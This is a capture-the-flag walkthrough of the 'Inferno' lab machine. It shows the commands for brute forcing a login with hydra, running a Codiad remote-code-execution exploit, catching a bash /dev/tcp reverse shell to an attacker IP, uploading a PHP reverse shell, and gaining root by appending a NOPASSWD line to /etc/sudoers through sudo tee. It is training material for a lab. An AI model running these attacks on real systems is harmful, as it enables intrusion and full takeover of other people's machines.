# Inferno

---

# Dante's Inferno CTF Walkthrough

> *"Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear."*
> 

There are two hash keys located on the machine: **user (`local.txt`)** and **root (`proof.txt`)**. Can you find them and become root?

**Remember:** in the nine circles of Hell you will find some demons that will try to prevent your access, ignore them and move on (if you can).

---

## Reconnaissance

Starting with the provided IP, we opened the website and saw an interface with an image and text in old Italian:

> *Oh, how great a wonder it seemed to me when I saw three faces on his head! One was in front, and it was red; the other two joined with this one above the middle of each shoulder, and they met at the top of the head.*
> 

Nothing interesting was found in the page source (Ctrl+U).

Using **Wappalyzer**, we identified the underlying technology:

- **OS:** Ubuntu
- **Web server:** Apache 2.4.21

Next, we ran a directory scan with `dirsearch`:

```bash
dirsearch -u http://<target-ip>/
```

The scan revealed an `/inferno` directory that hosted a login prompt.

---

## Brute Forcing the Login

We attempted to brute‑force the login page using `hydra`. The username `admin` was assumed, and the rockyou wordlist was used for passwords:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> -m /inferno http-get
```

The attack succeeded, and we obtained the password: **`dante1`**.

Entering these credentials on the `/inferno` login page led to another login prompt – but the same credentials worked again, granting us access to what appeared to be a GitHub‑like repository with many files.

---

## Codiad RCE Exploit

Inside the repository, a `README` file mentioned:

> *Codiad is a web based IDE framework with a small footprint and minimal requirements.*
> 

A quick search revealed that Codiad has a known Remote Code Execution (RCE) vulnerability. We downloaded the exploit from **Exploit‑DB** (ID 49705) and examined its usage:

```bash
python 49705.py
```

Output:

```
python 49705.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
```

We crafted the following command (replacing IPs accordingly):

```bash
python3 49705.py <http://admin>:dante1@<target-ip>/inferno 'admin' 'dante1' <kali-ip> 1234 linux
```

We also set up two netcat listeners in separate terminals:

```bash
# Terminal 1: listener for the exploit's callback
echo 'bash -c "bash -i >/dev/tcp/<kali-ip>/1235 0>&1 2>&1"' | nc -lnvp 1234

# Terminal 2: main reverse shell listener
nc -lnvp 1235
```

After a few seconds, we received a reverse shell – but it was unstable. To obtain a stable shell, we used a manual approach instead.

---

## Manual Reverse Shell via File Upload

Still logged into the Codiad interface, we navigated to the following directory structure (by clicking through folders):

```
/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/
```

Inside the `INF` folder, we right‑clicked and selected **Upload Files**. We uploaded a **PHP reverse shell** (e.g., the classic `php-reverse-shell.php`), after editing it to include our Kali IP and a chosen port (4444).

After uploading, we accessed the file directly:

```
http://<target-ip>/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/php-reverse-shell.php
```

This triggered the reverse shell, giving us a stable connection on the netcat listener:

```bash
nc -lnvp 4444
```

---

## User Flag (`local.txt`)

Once inside the shell, we navigated to the home directory of user `dante`:

```bash
cd /home/dante
```

We listed all files recursively:

```bash
ls -laR
```

This revealed interesting files: several `.txt` files in the `documents` folder and a `.dat` file in the `downloads` folder.

We examined the `.dat` file and found it contained **hexadecimal content**. Decoding it with CyberChef (or `xxd -r -p` in the terminal) gave us a password:

```
V1rg1l10h3lpm3
```

Using this password, we logged in via SSH as user `dante`:

```bash
ssh dante@<target-ip>
```

Once authenticated, we read the user flag:

```bash
cat local.txt
```

**User flag obtained.**

---

## Privilege Escalation to Root

With a shell as `dante`, we checked which commands could be run with `sudo`:

```bash
sudo -l
```

The output showed that `dante` could run `/usr/bin/tee` with sudo privileges. Searching **GTFOBins** for `tee` revealed a known technique to write to the `sudoers` file.

We executed the following command to add `dante` to the sudoers file with **NOPASSWD** privileges:

```bash
LFILE=/etc/sudoers
echo 'dante ALL=(ALL) NOPASSWD:ALL' | sudo /usr/bin/tee -a "$LFILE"
```

This appended the line, allowing `dante` to execute any command as root without a password. We then switched to root:

```bash
sudo su
```

Finally, we navigated to `/root` and retrieved the root flag:

```bash
cd /root
cat proof.txt
```

**Root flag obtained.**

---

## Conclusion

We successfully compromised the machine, obtaining both the user and root flags. The journey took us through web directory enumeration, brute‑forcing, exploiting a Codiad RCE vulnerability, manual reverse shell upload, password discovery from a `.dat` file, and finally privilege escalation via `sudo tee`.

---

**Flags:**

- User flag: `local.txt` (content hidden)
- Root flag: `proof.txt` (content hidden)